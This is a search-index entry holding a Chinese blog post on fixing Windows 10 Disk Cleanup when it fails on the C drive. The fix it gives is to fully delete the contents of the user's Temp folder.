    
    
    <entry>
      <title>Windows10 C盘无法磁盘清理或点击无反应（闪退）解决方案</title>
      <link href="/posts/8527cd39430b/"/>
      <url>/posts/8527cd39430b/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天系统又偷偷把Windows11更新文件给我下下来，导致我的C盘内存一下被吞掉十多GB</p><p>而我作为一个精神洁癖和完美主义者，显然容不下这些更新文件，只能找办法把它们删掉</p><p>但是在我删它们过程中，又遇到了新的问题：<strong>C盘点击磁盘清理没有反应</strong></p><p>如下图：</p><p><style>.xddwlcxvcpvl{zoom:80%;}</style><img src="/posts/8527cd39430b/857efd16-6cbf-42af-bfa2-74fe458d1234.png" class="xddwlcxvcpvl" alt="在这里插入图片描述"></p><p>好家伙，为了解决它我在网上一顿好找，但是基本上都没有什么效果</p><p>甚至微软自己的工程师给这个问题的解答也有点敷衍了事⬇，只是甩几个核验系统文件的shell指令</p><p>同时“我有相同问题”的人数也告诉我，遇到这个问题的人不在少数，很可能许多人实在找不到解决问题就放弃了，磁盘清理无法使用大不了靠别的途径，比如卸载系统盘软件来解决，但这终究指标不治本</p><p>功夫不负有心人，我终于在一个百度经验的回答找到些许灵感：</p><p><style>.xynfrijnnqlo{zoom:80%;}</style><img src="/posts/8527cd39430b/image-20230524210445216.png" class="xynfrijnnqlo" alt="在这里插入图片描述"></p><p>很显然这个百度经验只是把国外的解决视频机翻搬运过来的，其中的方法并没有什么卵用。但是<strong>临时文件</strong>几个字引起了我的注意。</p><p>对！就是<code>user/AppData/Local/Temp</code>文件夹下的临时文件，于是乎就有了下面的解决方案：</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ol><li><p>找到C盘中的Temp文件夹，具体路径为<code>C:\Users\你的用户名\AppData\Local\Temp</code></p><div class="note info flat"><p>   经常自己清理硬盘空间的同学们对这个文件夹并不陌生，但是由于有时删除不干净，就会导致在我们进行<strong>磁盘清理</strong>时，扫到这个文件然后因为未知错误（也许是爆内存了？）而卡住。</p>   <details class="toggle" ><summary class="toggle-button" style="">Temp文件的作用及清理方法</summary><div class="toggle-content"><p>在Windows 10操作系统中，临时文件夹（Temp文件夹）用于存储临时数据和缓存文件。这些文件可能是由应用程序、系统进程或其他操作创建的，用于暂时存储数据或辅助操作。临时文件夹的内容通常是可以安全删除的，清理这些文件可以释放磁盘空间并提高系统性能。</p><p>要清理Win10的临时文件夹，请按照以下步骤操作：</p><ol><li>打开文件资源管理器（Windows资源管理器），可以通过按下Win键和E键打开。</li><li>在地址栏中输入”%temp%”（不包括引号），然后按回车键。这将打开临时文件夹。</li><li>选中所有文件和文件夹（Ctrl+A），然后按下Shift+Delete键。这将永久删除选中的文件，而不将其放入回收站。</li><li>如果系统提示您无法删除某些文件，可能是因为这些文件正在被其他进程使用。在这种情况下，您可以选择跳过这些文件，或者在稍后的时间再次尝试删除它们。</li></ol><p>请注意，清理临时文件夹可能会导致某些应用程序丢失暂存的数据，因此在进行清理之前，请确保您不需要这些临时文件。此外，定期清理临时文件夹是一个好习惯，可以帮助保持系统的整洁和高效。</p></div></details></div></li><li><p><strong>彻底删除Temp文件夹中的内容</strong></p><div class="note warning flat"><p>无论你是用什么360的文件粉碎机还是一些自备的删除文件的软件，一定要确保文件夹里能彻底删除的都删掉</p></div><p>文章作者我使用的是火绒的<strong>粉碎文件</strong>功能：</p><p><style>.jovkerhittrm{zoom:80%;}</style><img src="/posts/8527cd39430b/image-20230524211435828.png" class="jovkerhittrm" alt="在这里插入图片描述"></p></li><li><p>删完之后即可打开C盘的磁盘清理，如下图</p><p><style>.gxdgppbktokr{zoom: 80%;}</style><img src="/posts/8527cd39430b/image-20230524211549861.png" class="gxdgppbktokr" alt="在这里插入图片描述"></p><div class="note success simple"><p>然后我们又能愉快又高雅地清理C盘啦！🥳🥳🥳</p></div></li></ol><p>我由衷的希望本文能够对您有所帮助</p>]]></content>
      
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
